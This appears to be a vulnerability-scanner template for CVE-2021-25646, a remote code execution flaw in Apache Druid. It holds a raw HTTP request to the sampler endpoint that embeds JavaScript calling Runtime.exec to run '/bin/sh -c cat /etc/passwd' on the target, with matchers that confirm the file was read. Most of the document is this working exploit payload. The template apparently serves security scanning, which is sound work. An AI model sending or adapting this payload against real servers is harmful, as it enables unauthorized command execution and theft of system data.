id: CVE-2021-25646
info:
  author: pikpikcu
  classification:
    cve-id: CVE-2021-25646
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-732
  description: 'Apache Druid is a column-oriented open source distributed data storage
    written in Java, designed to quickly obtain large amounts of event data and provide
    low-latency queries on the data.

    Apache Druid lacks authorization and authentication by default. Attackers can
    send specially crafted requests to execute arbitrary code with the privileges
    of processes on the Druid server.

    '
  name: Apache Druid RCE
  reference:
  - https://paper.seebug.org/1476/
  - https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
  - http://www.openwall.com/lists/oss-security/2021/01/29/6
  - https://lists.apache.org/thread.html/r64431c2b97209f566b5dff92415e7afba0ed3bfab4695ebaa8a62e5d@%3Cdev.druid.apache.org%3E
  severity: high
  tags: cve,cve2021,apache,rce,druid
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - application/json
  - condition: and
    part: body
    type: word
    words:
    - numRowsRead
    - numRowsIndexed
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  matchers-condition: and
  raw:
  - "POST /druid/indexer/v1/sampler HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n\"type\":\"index\",\n\"spec\":{\n   \"ioConfig\":{\n      \"type\":\"index\"\
    ,\n      \"firehose\":{\n         \"type\":\"local\",\n         \"baseDir\":\"\
    /etc\",\n         \"filter\":\"passwd\"\n      }\n   },\n   \"dataSchema\":{\n\
    \      \"dataSource\":\"odgjxrrrePz\",\n      \"parser\":{\n         \"parseSpec\"\
    :{\n            \"format\":\"javascript\",\n            \"timestampSpec\":{\n\n\
    \            },\n            \"dimensionsSpec\":{\n\n            },\n        \
    \    \"function\":\"function(){var hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\\\
    \"/bin/sh`@~-c`@~cat /etc/passwd\\\".split(\\\"`@~\\\")).getInputStream()).useDelimiter(\\\
    \"\\\\A\\\").next();return {timestamp:\\\"4137368\\\",OQtGXcxBVQVL: hTVCCerYZ}}\"\
    ,\n            \"\":{\n               \"enabled\":\"true\"\n            }\n  \
    \       }\n      }\n   }\n},\n\"samplerConfig\":{\n   \"numRows\":10\n}\n}\n"
